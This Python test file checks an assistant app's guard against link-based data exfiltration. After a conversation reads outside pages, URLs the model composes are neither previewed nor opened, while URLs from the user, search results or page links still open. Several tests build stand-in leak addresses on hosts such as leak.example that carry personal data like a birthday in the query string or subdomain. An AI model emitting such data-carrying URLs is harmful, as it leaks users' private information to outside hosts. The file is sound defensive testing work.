"""An address the model wrote itself carries nothing out once the conversation read outside material: a link card
of the character's reply fetches no preview and no icon for it, read_page, read_with_their_session and open do not
open it, in the person's turn as in a scheduled run, and nobody is asked; the model is told to find the page with a
search. An address the model was given (in the person's message, a search result, a page's links, on a host the app
knows or they typed) opens with no question, and a conversation that read nothing composes freely. Nothing of an
address is kept on disk but its hash. The search, the signed-in read and the app's browser are stand-ins and the
sites are the stand-in public web."""
from __future__ import annotations

import json
import time

import pytest
from harness.model import call, say

from mibo import browsed, given, search, surface
from mibo.panels import schedule

IP = "93.184.216.34"
STORY = ("<html><head><title>潮汐日报</title><meta property=\"og:title\" content=\"今天的潮汐\"></head><body>"
         "<article><h1>今天的潮汐</h1><p>{words}</p>{links}</article></body></html>")
WORDS = "早上六点低潮，潮汐池里能看到海星和寄居蟹，下午四点涨潮，礁石区请勿停留。" * 4
NOT_OPENED = "Error: not opened: "


@pytest.fixture
def searched(monkeypatch):
    """The web search answers every query with `rows`."""
    rows: list[dict] = []

    async def search_rows(self, query, max_results=6):
        return rows[:max_results]

    monkeypatch.setattr(search.WebSearch, "_search_rows", search_rows)
    return rows


def page(web, host: str, path: str, links: str = "") -> str:
    """A story with `links` served at `path` under `host`; its address."""
    base = web.name(host, IP)
    web.site.put(path, STORY.format(words=WORDS, links=links))
    return f"{base}{path}"


def got(done, name: str) -> list[str]:
    """What each call of `name` gave the model, in order."""
    return [done.result_of(c["id"]) for c in done.calls() if c["name"] == name]


def test_after_a_page_was_read_a_composed_address_gets_no_card_and_a_search_result_keeps_its_own(app, turn, web,
                                                                                                  searched):
    found = page(web, "results.example", "/found")
    composed = f"{web.name('leak.example', IP)}/c?d=%E5%A6%88%E5%A6%88%E7%9A%84%E7%94%9F%E6%97%A5"
    searched.append({"title": "今天的潮汐", "url": found, "snippet": "潮汐池"})
    turn("帮我查一下今天的潮汐", [call("web_search", query="今天的潮汐")], [call("read_page", url=found)],
         say(f"看这篇 {found} ，还有这个 {composed}"))
    card = app.get("/api/link/preview", params={"url": composed, "chat": "main"}).json()
    icon = app.get("/api/link/icon", params={"host": "leak.example", "chat": "main"}).json()
    assert card["given"] is False and not card["ok"] and not card["title"] and icon == {"icon": "", "given": False}
    kept = app.get("/api/link/preview", params={"url": found, "chat": "main"}).json()
    assert kept["ok"] and kept["title"] == "今天的潮汐"
    # A click on the composed one is shown whole first; the search result opens at once.
    assert app.get("/api/link/given", params={"url": composed, "chat": "main"}).json() == {"given": False}
    assert app.get("/api/link/given", params={"url": found, "chat": "main"}).json() == {"given": True}
    assert "leak.example" not in web.lookups and not any("/c?" in line for line in web.site.log)


def test_a_composed_read_after_outside_material_is_not_opened_and_a_search_result_reaches_the_page(turn, web,
                                                                                                   searched):
    story = page(web, "shore.example", "/story")
    composed = page(web, "tides-guide.example", "/today")
    done = turn("读一下这篇文章，再找找潮汐指南", [call("read_page", url=story)], [call("read_page", url=composed)],
                say("没打开。"), cards="no")
    refused = got(done, "read_page")[1]
    assert done.cards == [] and done.questions == []
    assert refused == given.NOT_OPENED["turn"].format(url=composed)
    assert "web_search" in refused and "give it to them in your reply" in refused
    assert "GET /today" not in web.site.log
    searched.append({"title": "潮汐指南", "url": composed, "snippet": "潮汐"})
    again = turn("搜一下潮汐指南", [call("web_search", query="潮汐指南")], [call("read_page", url=composed)],
                 say("好了。"), cards="no")
    assert again.cards == [] and not got(again, "read_page")[0].startswith(NOT_OPENED)
    assert "GET /today" in web.site.log


def test_a_scheduled_run_does_not_open_a_composed_address_and_points_to_propose_action(app, turn, web, monkeypatch):
    monkeypatch.setattr(schedule, "TICK_S", 0.2)
    story = page(web, "shore.example", "/story")
    composed = f"{web.name('leak.example', IP)}/c?d=birthday-0312"
    turn("读一下这篇文章", [call("read_page", url=story)], say("读完了。"))
    task = app.post("/api/schedule", {"action": "create", "fields": {
        "title": "潮汐", "kind": "task", "request": "看看今天的潮汐", "when": "每天早上八点"}}).json()["tasks"][0]
    app.model.script([call("read_page", url=composed)], say("看过了。"))
    seen = len(app.model.requests)
    app.post("/api/schedule", {"action": "run", "id": task["id"]})
    for _ in range(600):
        if app.get("/api/schedule").json()["tasks"][0]["runs"]:
            break
        time.sleep(0.1)
    told = [m["content"] for r in app.model.requests[seen:] for m in r["body"]["messages"] if m.get("role") == "tool"]
    assert told and told[0] == given.NOT_OPENED["run"].format(url=composed) and "propose_action" in told[0]
    assert not any(line.startswith("GET /c?") for line in web.site.log)


def test_a_conversation_that_read_nothing_opens_a_composed_address_with_no_question(turn, web):
    composed = page(web, "leak.example", "/c")
    done = turn("帮我看看潮汐网站的那篇文章", [call("read_page", url=composed)], say("好了。"), cards="no")
    assert done.cards == [] and "GET /c" in web.site.log


def test_addresses_from_a_search_a_pages_links_and_their_message_open_with_no_question(turn, web, searched):
    port = web.name("tidesdaily.com", IP).rsplit(":", 1)[1]
    elsewhere = web.name("other.example", IP)
    story = page(web, "shore.example", "/story", f'<a href="/next">下一篇</a><a href="{elsewhere}/linked">别处</a>')
    found = page(web, "results.example", "/found")
    for path in ("/next", "/linked", "/a", "/b"):
        web.site.put(path, STORY.format(words=WORDS, links=""))
    searched.append({"title": "今天的潮汐", "url": found, "snippet": "潮汐池"})
    done = turn(f"读一下 {story} ，再看看 tidesdaily.com:{port}/a/ 和 http://tidesdaily.com:{port}/b#top",
                [call("read_page", url=story)], [call("web_search", query="潮汐")],
                [call("read_page", url=found), call("read_page", url=story.replace("/story", "/next")),
                 call("read_page", url=f"{elsewhere}/linked"), call("read_page", url=f"http://tidesdaily.com:{port}/a"),
                 call("read_page", url=f"http://tidesdaily.com:{port}/b/")],
                say("都读了。"), cards="no")
    assert done.cards == []
    assert not any(r.startswith(NOT_OPENED) for r in got(done, "read_page"))
    assert {"GET /found", "GET /next", "GET /linked", "GET /a", "GET /b/"} <= set(web.site.log)


def test_an_address_on_a_host_the_app_knows_opens_with_no_question(turn, web):
    story = page(web, "shore.example", "/story")
    named = f"{web.name('github.com', IP)}/search?q=tides"
    web.site.put("/search?q=tides", STORY.format(words=WORDS, links=""))
    done = turn("读一下这篇，然后去 GitHub 看看有没有相关项目", [call("read_page", url=story)],
                [call("read_page", url=named)], say("看过了。"), cards="no")
    assert done.cards == [] and "GET /search?q=tides" in web.site.log


def test_a_users_own_host_on_a_known_platform_is_not_the_platform(turn, web):
    story = page(web, "shore.example", "/story")
    own = f"{web.name('mama-0312.tumblr.com', IP)}/post/1"
    platform = f"{web.name('tumblr.com', IP)}/tagged/tides"
    web.site.put("/tagged/tides", STORY.format(words=WORDS, links=""))
    done = turn("读一下这篇，再去 Tumblr 看看潮汐的帖子", [call("read_page", url=story)],
                [call("read_page", url=own)], [call("read_page", url=platform)], say("看过了。"), cards="no")
    refused, opened = got(done, "read_page")[1:]
    assert refused.startswith(NOT_OPENED) and not opened.startswith(NOT_OPENED)
    assert "mama-0312.tumblr.com" not in web.lookups and "GET /tagged/tides" in web.site.log


def test_a_known_sites_mobile_and_language_hosts_are_the_site_and_no_other_sub_domain_is():
    for address in ("https://zh.wikipedia.org/wiki/潮汐", "https://en.m.wikipedia.org/wiki/Tide",
                    "https://m.youtube.com/watch?v=abc", "https://news.ycombinator.com/item?id=1",
                    "https://search.bilibili.com/all?keyword=tides"):
        assert given.given(address, set(), []), address
    for address in ("https://mama-0312.tumblr.com/post/1", "https://m.leak.example/c",
                    "https://zh.leak.example/c", "https://d3adb33f.wikipedia.org/wiki/x"):
        assert not given.given(address, set(), []), address


def test_a_host_only_in_material_gives_no_composed_address_on_it(turn, web):
    elsewhere = web.name("other.example", IP)
    story = page(web, "shore.example", "/story", f'<a href="{elsewhere}/linked">别处</a>')
    done = turn("读一下这篇文章", [call("read_page", url=story)],
                [call("read_page", url=f"{elsewhere}/c?d=birthday-0312")], say("好。"), cards="no")
    assert done.cards == [] and got(done, "read_page")[1].startswith(NOT_OPENED)
    assert not any(line.startswith("GET /c?") for line in web.site.log)


def test_a_data_carrying_sub_domain_of_a_host_they_typed_is_opened_only_when_their_words_hold_it(app, turn, web,
                                                                                                 searched):
    port = web.name("tidesdaily.com", IP).rsplit(":", 1)[1]
    found = f"http://tidesdaily.com:{port}/found"
    carrying = f"{web.name('mama-0312.tidesdaily.com', IP)}/"
    for path in ("/found", "/"):
        web.site.put(path, STORY.format(words=WORDS, links=""))
    searched.append({"title": "今天的潮汐", "url": found, "snippet": "潮汐池"})
    script = ([call("web_search", query="潮汐")], [call("read_page", url=found)], [call("read_page", url=carrying)],
              say("好。"))
    refused = turn("在 tidesdaily.com 上查一下今天的潮汐", *script, cards="no",
                   conversation=app.post("/api/chats", {}).json()["id"])
    assert refused.cards == [] and got(refused, "read_page")[1].startswith(NOT_OPENED)
    assert "mama-0312.tidesdaily.com" not in web.lookups
    theirs = turn("在 mama-0312.tidesdaily.com 上查一下今天的潮汐", *script, cards="no",
                  conversation=app.post("/api/chats", {}).json()["id"])
    assert theirs.cards == [] and not any(r.startswith(NOT_OPENED) for r in got(theirs, "read_page"))
    assert "mama-0312.tidesdaily.com" in web.lookups


def test_a_signed_in_read_after_outside_material_opens_a_given_address_and_not_a_composed_one(turn, web,
                                                                                              monkeypatch):
    read = []

    def read_signed_in(home, url):
        read.append(url)
        return {"url": url, "title": "订单", "text": "三笔订单，都已发货。"}

    monkeypatch.setattr(browsed, "read_signed_in", read_signed_in)
    story = page(web, "shore.example", "/story", '<a href="https://shop.example/orders">我的订单</a>')
    done = turn("读一下这篇文章", [call("read_page", url=story)],
                [call("read_with_their_session", url="https://shop.example/orders?note=birthday-0312")],
                [call("read_with_their_session", url="https://shop.example/orders")], say("好。"), cards="no")
    refused, opened = got(done, "read_with_their_session")
    assert done.cards == [] and refused.startswith(NOT_OPENED) and "三笔订单" in opened
    assert read == ["https://shop.example/orders"]


def test_open_after_outside_material_opens_a_given_address_and_not_a_composed_one(turn, web, monkeypatch):
    placed = []

    async def browser(home, op, timeout=60, **fields):
        if op == "place":
            placed.append(fields["url"])
            return {"id": 1, "url": fields["url"], "title": "潮汐"}
        return {"tabs": []}

    monkeypatch.setattr(surface, "_browser", browser)
    story = page(web, "shore.example", "/story", '<a href="https://shop.example/tides">潮汐表</a>')
    done = turn("读一下这篇文章", [call("read_page", url=story)],
                [call("open", name="https://shop.example/tides?note=birthday-0312", show=True)],
                [call("open", name="https://shop.example/tides", show=True)], say("好。"), cards="no")
    refused, opened = got(done, "open")
    assert done.cards == [] and refused.startswith(NOT_OPENED)
    assert opened.startswith("Opened https://shop.example/tides") and placed == ["https://shop.example/tides"]


def test_the_kept_given_addresses_hold_no_byte_of_them(app, turn, web, searched):
    found = page(web, "results.example", "/found/birthday-0312")
    searched.append({"title": "今天的潮汐", "url": found, "snippet": "潮汐池"})
    turn("帮我查一下今天的潮汐", [call("web_search", query="今天的潮汐")], [call("read_page", url=found)], say("好。"))
    kept = (app.home / "runtime" / "desktop" / given.FILE).read_text(encoding="utf-8")
    (row,) = json.loads(kept).values()
    assert row["outside"] and given.digest(given.form(found)) in row["given"]
    assert "results" not in kept and "birthday" not in kept and "0312" not in kept
